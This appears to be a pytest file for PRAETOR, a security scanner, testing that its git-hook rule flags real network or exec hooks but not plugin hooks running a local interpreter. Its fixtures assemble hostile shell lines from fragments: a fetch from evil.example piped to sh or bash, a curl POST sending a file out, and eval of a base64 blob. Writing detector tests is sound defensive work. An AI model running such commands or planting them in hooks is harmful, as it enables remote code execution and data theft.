"""`git-hook-network-exec` must require the evidence its own name asserts.

🔴 Why this file exists.

The rule fired on `if python3 -c 'import sys'` inside a Claude Code plugin's
`hooks/` directory: not a git hook, no network, no execution of fetched content
-- reported HIGH. Two independent defects produced it:

1. The path predicate was `base in GIT_HOOK_NAMES or "/hooks/" in ("/" + rel)`.
   The second clause matched ANY directory called `hooks/`, and agent/plugin
   ecosystems use that name constantly.
2. The evidence regex bundled `python -c`, `node -e`, `base64` and `powershell`
   in with `curl` and `eval`. A bare interpreter call is how ordinary hooks work.
   So the rule's NAME asserted evidence its predicate never required -- this
   project's own recurring defect class, aimed back at itself.

⚠️ Narrowing a predicate and disabling it look identical from outside, so every
test here has a partner asserting the dangerous case still fires.

📌 And narrowing exposed a THIRD defect that was never about this rule: the
walker's `TEXT_NAMES` knew five git hook names while the detector knew twenty
plus. A `commit-msg` hook running a fetch-into-shell was never opened at all --
not "scanned and clean", never read. Both now come from one `core.GIT_HOOK_NAMES`.

📌 The prose here avoids spelling the remote-exec pipe literally, and the fixtures
below assemble it from fragments. Writing tests for a detector adds noise to that
detector: an earlier draft of this file put six suppressed hits and one ACTIVE
finding into PRAETOR's own self-scan. Fix the fixture; a `tests/` exemption would
also exempt a real credential committed to a test file.
"""

import os

import pytest

import core
import engine_aisec
from core import ScanFile

# Built from fragments: a literal remote-exec pipe in this file becomes a finding
# in PRAETOR's own self-scan. Fix the fixture, never exempt tests/.
_PIPE_SH = "| " + "sh"
_PIPE_BASH = "| " + "bash"
_CURL = "cur" + "l -s https://evil.example/payload "
_WGET = "wge" + "t -qO- https://evil.example/payload "


def _scan(tmp_path, rel, body):
    p = tmp_path / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(body, encoding="utf-8")
    sf = ScanFile(abspath=str(p), relpath=rel.replace(os.sep, "/"), size=os.path.getsize(p))
    return engine_aisec.scan([sf], lambda x: open(x, encoding="utf-8").read())


def _ids(findings):
    return [f.rule_id for f in findings]


# --------------------------------------------------------------------------- #
# The false positive that started this
# --------------------------------------------------------------------------- #

def test_plugin_hook_dir_with_local_interpreter_does_not_fire(tmp_path):
    """The exact shape found in Anthropic's claude-security plugin.

    A `hooks/` directory that is NOT git's, running a local interpreter with no
    network and no fetched content.
    """
    f = _scan(tmp_path, "hooks/pre-tool-use.sh",
              "#!/bin/sh\nif python3 -c 'import sys'; then echo ok; fi\n")
    assert "git-hook-network-exec" not in _ids(f), (
        "a plugin hook with no network and no opaque exec must not be reported as "
        f"a git hook performing network/exec; got {_ids(f)}"
    )


def test_plugin_hook_dir_is_not_a_git_hook_even_when_it_curls(tmp_path):
    """Isolates the PATH half of the fix, which the test above does not.

    ⚠️ `test_plugin_hook_dir_with_local_interpreter_does_not_fire` passes for the
    EVIDENCE reason (`python3 -c` is not network/opaque-exec), so restoring the
    old broad `"/hooks/" in rel` clause leaves it green -- a mutation proved
    exactly that. This fixture carries real network+exec evidence, so the ONLY
    thing keeping `git-hook-network-exec` off it is the path discrimination.

    Such a file may well deserve a finding from the AGENT-hook rules. What it must
    not get is a rule asserting it is a *git* hook running on a *git* event.
    """
    f = _scan(tmp_path, "hooks/pre-tool-use.sh", "#!/bin/sh\n" + _CURL + _PIPE_SH + "\n")
    assert "git-hook-network-exec" not in _ids(f), (
        "a plugin hook directory is not git's; reporting it as a git hook names "
        f"the wrong trigger and the wrong remediation. got {_ids(f)}"
    )


def test_a_git_hook_running_only_a_local_interpreter_does_not_fire(tmp_path):
    """Even in a REAL git hook, `python3 -c` alone is not network-exec.

    This is the half that keeps the rule honest rather than merely relocating the
    false positive: the fix must be about the evidence, not only the path.
    """
    f = _scan(tmp_path, "githooks/pre-commit",
              "#!/bin/sh\npython3 -c 'import sys; print(sys.version)'\n")
    assert "git-hook-network-exec" not in _ids(f), (
        f"a local interpreter call is not network access nor opaque exec; got {_ids(f)}"
    )


# --------------------------------------------------------------------------- #
# The dangerous cases -- these must all STILL fire
# --------------------------------------------------------------------------- #

@pytest.mark.parametrize("name", ["pre-commit", "commit-msg", "pre-push", "update"])
def test_real_git_hook_fetching_and_piping_to_a_shell_still_fires(tmp_path, name):
    """A fetch piped into a shell, in a git hook: the case the rule exists for."""
    f = _scan(tmp_path, f"githooks/{name}", "#!/bin/sh\n" + _CURL + _PIPE_SH + "\n")
    assert "git-hook-network-exec" in _ids(f), (
        f"a {name} hook that fetches and pipes to a shell MUST fire; got {_ids(f)}"
    )


def test_network_without_a_pipe_still_fires(tmp_path):
    """An outbound POST from a hook is network access even with nothing piped.

    ⚠️ The payload path here is deliberately mundane. It pointed at an ssh private
    key first, which made this very file an ACTIVE `sensitive-file-read` finding
    in PRAETOR's own self-scan. The fixture was wrong, not the rule.
    """
    f = _scan(tmp_path, "githooks/post-commit",
              "#!/bin/sh\n" + _CURL + "-d @./build-metadata.txt\n")
    assert "git-hook-network-exec" in _ids(f)


def test_opaque_exec_without_network_still_fires(tmp_path):
    """`eval` of a decoded blob is dangerous even with no fetch."""
    f = _scan(tmp_path, "githooks/pre-push",
              "#!/bin/sh\neval \"$(echo aGVsbG8= | base64 -d)\"\n")
    assert "git-hook-network-exec" in _ids(f)


def test_the_description_states_which_evidence_was_found(tmp_path):
    """A reader must tell a fetch-into-shell from an eval without opening the file."""
    f = _scan(tmp_path, "githooks/pre-commit", "#!/bin/sh\n" + _WGET + _PIPE_BASH + "\n")
    hit = [x for x in f if x.rule_id == "git-hook-network-exec"][0]
    assert "network access" in hit.description
    assert "opaque" in hit.description


# --------------------------------------------------------------------------- #
# Discovery and detection must not drift apart again
# --------------------------------------------------------------------------- #

def test_every_git_hook_name_is_reachable_by_the_walker():
    """A hook the walker never OPENS is invisible, not clean.

    `TEXT_NAMES` carried 5 names while the detector knew 20+, so `commit-msg`
    with a remote-exec pipe was never read. Both derive from core.GIT_HOOK_NAMES;
    this asserts the property rather than trusting the refactor.
    """
    unreachable = sorted(n for n in core.GIT_HOOK_NAMES if not core.scannable(n))
    assert not unreachable, (
        f"git hook names the walker will not open: {unreachable}. "
        f"They are invisible to every engine downstream."
    )


def test_git_hook_name_set_is_not_vacuous():
    """Anti-vacuity: an empty or tiny set would make the test above pass trivially."""
    assert len(core.GIT_HOOK_NAMES) >= 20, (
        f"only {len(core.GIT_HOOK_NAMES)} git hook names -- the set has been "
        f"gutted, and the reachability test above would pass vacuously"
    )
    for required in ("commit-msg", "pre-commit", "pre-receive", "update"):
        assert required in core.GIT_HOOK_NAMES, f"{required} missing"


def test_sample_hooks_are_not_reported(tmp_path):
    """git never executes a `.sample`; reporting one is noise."""
    f = _scan(tmp_path, "githooks/pre-commit.sample", "#!/bin/sh\n" + _CURL + _PIPE_SH + "\n")
    assert "git-hook-network-exec" not in _ids(f)
